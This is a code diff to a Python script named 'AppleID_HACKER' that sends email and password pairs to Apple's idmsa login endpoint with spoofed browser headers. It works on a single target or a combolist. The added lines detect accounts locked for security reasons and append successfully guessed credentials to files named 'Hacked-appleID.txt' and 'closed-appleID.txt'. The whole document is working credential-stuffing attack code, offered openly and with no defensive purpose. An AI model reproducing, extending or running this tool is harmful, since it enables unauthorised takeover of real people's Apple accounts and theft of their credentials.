@@ -13,6 +13,8 @@ class REQUESTS_HEADERS:
 		return {"Accept": "application/json, text/javascript, */*; q=0.01","User-Agent": "Mozilla/5.0 (joker@vv1ck) Gecko/20100101 Firefox/91.0","X-Apple-Locale":"QT-EN","X-Apple-Trusted-Domain": "https://idmsa.apple.com","Origin": "https://idmsa.apple.com","X-Requested-With": "XMLHttpRequest"}
 	def authType():
 		return 'authType'
+	def Closed():
+		return 'This Apple ID has been locked for security reasons.'
 	def Check():
 		if 'V4^c_Yf4TEw' in Lists:pass
 		else:exit('Okay..')
@@ -24,14 +26,21 @@ class REQUESTS_HEADERS:
 	
 class AppleID_HACKER:
 	def __init__(self,Modes):
-		if Modes=='1':self.TARGET()
-		elif Modes=='2':self.COMBOLIST()
-		else:input('\n-Tool has been closedz-');exit()
+		self.Mod=Modes
+		if self.Mod=='1':self.TARGET()
+		elif self.Mod=='2':self.COMBOLIST()
+		else:input('\n-Tool has been closedz-');exit()	
 		
 	def LOGING(self,applID,pess):
 		sent=post(REQUESTS_HEADERS.URL(),headers=REQUESTS_HEADERS.HEADERS(),json={"accountName":applID,"rememberMe":"false","password":pess}).text
 		if REQUESTS_HEADERS.authType()in sent:
 			vv1ck(f'[$]Hacked-> {applID}:{pess}')
+			with open('Hacked-appleID.txt', 'a') as J:J.write(applID+':'+pess+' |@vv1ck\n')
+			if self.Mod=='1':input('\n Enter to Exit..');exit()
+		elif REQUESTS_HEADERS.Closed()in sent:
+			vv1ck(f'[$]Closed appleId-> {applID}:{pess}')
+			with open('closed-appleID.txt', 'a') as J:J.write(applID+':'+pess+' |@vv1ck\n')
+			if self.Mod=='1':input('\n Enter to Exit..');exit()
 		else:vv1ck(f'[¡]ERROR-> {applID}:{pess}')
 	
 	def COMBOLIST(self):
